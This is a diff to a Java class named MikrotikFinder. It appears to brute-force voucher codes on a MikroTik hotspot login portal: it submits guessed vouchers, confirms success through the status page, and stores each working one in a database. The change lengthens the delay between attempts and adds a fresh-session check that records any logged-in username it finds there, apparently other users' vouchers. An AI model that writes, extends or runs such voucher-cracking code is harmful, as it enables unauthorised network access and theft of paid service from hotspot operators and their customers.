@@ -158,28 +158,37 @@ public class MikrotikFinder {
         httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
 
-        try { Thread.sleep(300); } catch (InterruptedException e) { return false; }
+        try { Thread.sleep(500); } catch (InterruptedException e) { return false; }
         if (!running.get()) return false;
 
-        String afterJson = httpGet(base + STATUS_PATH, session, 4000);
-        if (afterJson == null) return false;
-
-        String user = getStr(afterJson, "username");
-        if (user == null || user.isEmpty() || user.equals("-")) {
+        String ourStatus = httpGet(base + STATUS_PATH, session, 4000);
+        if (ourStatus == null) return false;
+        String ourUser = getStr(ourStatus, "username");
+        if (ourUser == null || ourUser.isEmpty() || ourUser.equals("-")) {
             String htmlUser = readRealUsername(session);
-            if (htmlUser != null && !htmlUser.isEmpty()) user = htmlUser;
+            if (htmlUser != null && !htmlUser.isEmpty()) ourUser = htmlUser;
         }
-        if (user == null || !user.equals(voucher)) return false;
+        if (ourUser == null || !ourUser.equals(voucher)) return false;
 
-        if (!verifyRealAccess(session)) {
-            try { httpGet(base + "/logout", session, 2000); } catch (Exception e) {}
-            return false;
+        WorkerSession fresh = new WorkerSession();
+        String freshStatus = httpGet(base + STATUS_PATH, fresh, 5000);
+        String freshUser = getStr(freshStatus, "username");
+        if (freshUser != null && !freshUser.isEmpty() && !freshUser.equals("-") && !freshUser.equals("N/A")) {
+            lastStatusJson = freshStatus;
+            db.addFound(freshUser, freshStatus);
+            currentVoucher = freshUser;
+            return true;
         }
 
-        lastStatusJson = afterJson;
-        db.addFound(voucher, afterJson);
-        currentVoucher = voucher;
-        return true;
+        if (verifyRealAccess(session)) {
+            lastStatusJson = ourStatus;
+            db.addFound(voucher, ourStatus);
+            currentVoucher = voucher;
+            return true;
+        }
+
+        try { httpGet(base + "/logout", session, 2000); } catch (Exception e) {}
+        return false;
     }
 
     private boolean verifyRealAccess(WorkerSession session) {
